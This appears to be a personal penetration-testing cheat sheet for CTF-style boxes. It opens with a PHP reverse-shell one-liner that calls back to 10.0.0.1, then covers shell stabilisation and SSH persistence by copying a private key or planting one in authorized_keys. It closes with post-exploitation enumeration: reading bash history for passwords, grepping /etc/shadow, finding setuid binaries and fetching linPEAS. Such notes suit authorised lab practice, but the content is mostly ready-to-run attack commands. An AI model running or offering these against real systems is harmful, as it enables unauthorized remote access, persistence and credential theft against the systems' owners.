# Access
`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

*   The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
*    Step two is: `export TERM=xterm` -- this will give us access to term commands such as clear.
*    Finally (and most importantly) we will background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.  
![revshell](https://i.imgur.com/bQnFz1T.png)

# SSH
id_rsa file that contains a private key that can be used to connect to a box via ssh. It is usually located in the `.ssh` folder in the user's home folder. (Full path: `/home/user/.ssh/id_rsa`)
Get that file on your system and give it read/write-only permissions for your user:
(`chmod 600 id_rsa`) and connect by executing `ssh -i id_rsa user@ip`).

In case if the target box does not have a generated id_rsa file (or you simply don't have reading permissions for it), you can still gain stable ssh access. All you need to do is generate your own id_rsa key on your system and include an associated key into authorized_keys file on the target machine.
Execute ssh-keygen and you should see id_rsa and id_rsa.pub files appear in your own .ssh folder. Copy the content of the id_rsa.pub file and put it inside the authorized_key file on the target machine (located in .ssh folder). After that, connect to the machine using your id_rsa file.

# Basic Enum

> First, let's start with the uname command. uname prints information about the system. 

> Next in our list are auto-generated bash files.
Bash keeps tracks of our actions by putting plaintext used commands into a history file. (~/.bash_history)
If you happen to have a reading permission on this file, you can easily enumerate system user's action and retrieve some sensitive infrmation. One of those would be plaintext passwords or privilege escalation methods. 

sudo -V to retrieve sudo version.
sudo -l to check if a user on the box is allowed to use sudo with any command on the system.

> /etc | passwd|shadow|hosts

> Go to root and search for files with >find -type f "*.log" 2>/dev/null

> Find setuids `find / -perm -u=s -type f 2>/dev/null`  \

> grep | grep '' /etc/shadow
> netstat -at | less
> netstat -tulpn

> automate `wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh`
> `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`